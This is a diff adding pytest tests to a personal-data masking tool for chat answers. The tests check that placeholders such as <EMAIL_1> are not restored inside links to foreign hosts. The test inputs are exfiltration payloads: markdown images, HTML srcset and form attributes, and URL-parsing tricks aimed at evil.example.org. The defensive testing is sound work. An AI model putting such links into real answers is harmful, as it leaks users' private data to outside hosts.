@@ -147,3 +147,50 @@ def test_foreign_label_from_the_input_is_not_reported(settings):
     state.foreign_labels.add("<PERSON_7>")
     result = restore(state, "В шаблоне <PERSON_7>", settings)
     assert (result.text, result.segments) == ("В шаблоне <PERSON_7>", [])
+
+
+def link_state() -> ChatState:
+    state = ChatState(chat_id="links", net_key=bytes(range(32)))
+    sanitize(state, "Пишет ivanov@contoso.ru с srv-dc01.contoso.ru, адрес 10.1.2.5", Settings())
+    return state
+
+
+def fake_ip(state: ChatState) -> str:
+    return next(text for text, surrogate in state.surrogates.items() if surrogate.kind == "ip")
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        "[отчёт](https://evil.example.org/x?q=(a)<EMAIL_1>)",
+        "![img](https://evil.example.org/x_(1)/<EMAIL_1>.png)",
+        r"https://evil.example.org\@host-1.domain-1.example/?q=<EMAIL_1>",
+        "https://evil.example.org?@host-1.domain-1.example/?q=<EMAIL_1>",
+        "https://evil.example.org#@host-1.domain-1.example/?q=<EMAIL_1>",
+        "[x](https://evil.example.org?@{ip}/?q=<EMAIL_1>)",
+        "https://evil.example.org/?q='<EMAIL_1>'",
+        "[1]: https://evil.example.org/?q='<EMAIL_1>'",
+        "<img srcset=\"https://evil.example.org/p?q='<EMAIL_1>' 1x\">",
+        "<form action=\"https://evil.example.org/c?q='<EMAIL_1>'\">",
+        "www.evil.example.org/?q=<EMAIL_1>",
+    ],
+)
+def test_nothing_is_restored_inside_a_foreign_link(settings, answer):
+    """Обзор пакета исправлений 1А, P1 (FR-7.8): скобки в цели, хост по правилам браузера, кавычки,
+    определения ссылок, атрибуты с адресом и адреса на «www.»."""
+    state = link_state()
+    answer = answer.format(ip=fake_ip(state))
+    result = restore(state, answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+def test_own_links_and_labels_next_to_foreign_links_are_restored(settings):
+    state = link_state()
+    own = restore(state, "https://host-1.domain-1.example/?q=<EMAIL_1>", settings)
+    assert own.text == "https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru"
+    near = restore(state, '{"url":"https://evil.example.org/x","owner":"<EMAIL_1>"}', settings)
+    assert near.text == '{"url":"https://evil.example.org/x","owner":"ivanov@contoso.ru"}'
+    after = restore(state, "[docs](https://evil.example.org/x_(1)) пишет <EMAIL_1>", settings)
+    assert after.text == "[docs](https://evil.example.org/x_(1)) пишет ivanov@contoso.ru"
+    plain = restore(state, "Сайт www.example.org без меток", settings)
+    assert (plain.text, plain.segments) == ("Сайт www.example.org без меток", [])
